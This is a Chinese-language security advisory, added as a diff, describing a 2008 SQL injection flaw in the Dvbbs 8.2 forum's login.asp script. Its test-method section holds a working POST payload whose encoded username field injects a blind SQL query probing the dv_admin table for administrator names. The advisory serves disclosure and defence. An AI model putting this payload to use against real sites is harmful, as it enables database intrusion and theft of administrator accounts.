@@ -1,0 +1,40 @@
+BUGTRAQ ID: 29429 
+CNCAN ID：CNCAN-2008053003 
+
+漏洞消息时间:2008-05-29 
+
+漏洞起因 
+输入验证错误 
+
+影响系统 
+Dvbbs Dvbbs 8.2 
+
+不受影响系统 
+
+危害 
+远程攻击者可以利用漏洞进行SQL注入攻击，可能获得敏感信息或操作数据库。 
+
+攻击所需条件 
+攻击者必须访问dvbbs。 
+
+漏洞信息 
+dvbbs是一款国内流行的论坛程序。 
+dvbbs不正确处理用户提交的输入，远程攻击者可以利用漏洞进行SQL注入攻击，可能获得敏感信息或操作数据库。 
+问题是'login.asp'脚本对用户提交给WEB参数缺少过滤，构建恶意SQL查询作为参数数据，可更改原来的SQL逻辑，获得敏感信息或操作数据库。 
+
+测试方法 
+password=123123&codestr=71&CookieDate=2&userhidden=2&comeurl=index.asp&submit=%u7ACB%u5373%u767B%u5F55&ajaxPost=1&username=where%2527%2520and%25201%253D%2528select%2520count%2528*%2529%2520from%2520dv_admin%2520where%2520left%2528username%252C1%2529%253D%2527a%2527%2529%2520and%2520%25271%2527%253D%25271 
+
+厂商解决方案 
+可联系供应商获得补丁信息： 
+http://www.dvbbs.net/ 
+
+漏洞提供者 
+hackerb@hotmail.com 
+
+漏洞消息链接 
+http://seclists.org/bugtraq/2008/May/0330.html 
+
+漏洞消息标题 
+dvbbs8.2(access/sql)version login.asp remote sql injection
+
